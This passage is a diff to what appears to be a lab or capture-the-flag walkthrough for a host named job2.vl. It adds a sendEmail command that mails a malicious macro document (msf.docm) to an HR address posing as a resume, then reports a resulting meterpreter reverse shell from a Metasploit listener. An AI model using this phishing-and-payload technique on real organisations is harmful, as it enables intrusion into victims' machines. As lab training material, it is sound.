@@ -233,5 +233,13 @@ msf exploit(multi/handler) > run
 Ill then set the listener, ill make sure to set the same payload as i did in the file generation, then simply add my IP and port in again
 
 ```python
-
+❯❯❯ sendEmail -f attacker@job2.vl -t hr@job2.vl -u 'Job Application' -m 'Here is my resume' -a msf.docm -s job2.vl:25 
+Oct 31 20:16:19 localhost sendEmail[42304]: Email was sent successfully!
 ```
+
+Then ill send the email
+
+![](Pasted%20image%2020261031202131.png)
+
+And after a second i get a meterpreter session
+
